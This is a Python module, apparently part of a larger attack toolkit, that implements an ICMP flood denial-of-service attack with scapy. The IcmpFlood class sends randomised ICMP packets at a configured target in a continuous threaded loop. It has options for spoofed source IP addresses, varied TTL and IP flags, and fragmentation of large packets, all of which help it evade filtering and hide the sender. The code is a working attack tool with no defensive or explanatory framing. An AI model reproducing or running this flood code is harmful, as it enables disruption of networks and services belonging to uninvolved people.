import asyncio
import random
from scapy.all import IP, ICMP, send, fragment
from src.attacks.base import AttackBase

class IcmpFlood(AttackBase):
    async def attack_loop(self):
        print("Starte ICMP-Flood Angriff...")
        from concurrent.futures import ThreadPoolExecutor
        loop = asyncio.get_event_loop()
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            while not self.stop_event.is_set():
                packet_size = self._get_random_packet_size()
                payload = self._add_packet_padding(packet_size)
                icmp_type = random.choice([0, 8, 11, 3])
                icmp_code = 0
                if icmp_type == 3:
                    icmp_code = random.randint(0, 15)
                elif icmp_type == 11:
                    icmp_code = random.randint(0, 1)
                src_ip = self._get_random_ip() if self.config.use_ip_spoofing else None
                ttl = self._get_random_ttl() if self.config.ttl_variation else 64
                flags = self._get_random_ip_flags() if self.config.randomize_ip_flags else 0
                ip_params = {"dst": self.config.target, "ttl": ttl, "flags": flags}
                if src_ip:
                    ip_params["src"] = src_ip
                packet = IP(**ip_params) / ICMP(type=icmp_type, code=icmp_code, id=random.randint(1, 65535)) / payload
                should_fragment = packet_size > 1400 and random.random() < 0.7
                if should_fragment:
                    task = lambda p=packet: [send(frag, verbose=False) for frag in fragment(p)]
                else:
                    task = lambda p=packet: send(p, verbose=False)
                if self.task_queue:
                    await self.task_queue.put((task, ()))
                else:
                    await loop.run_in_executor(executor, task)
                self.stats.update_sent(1, packet_size + 28)
                await asyncio.sleep(0.001)
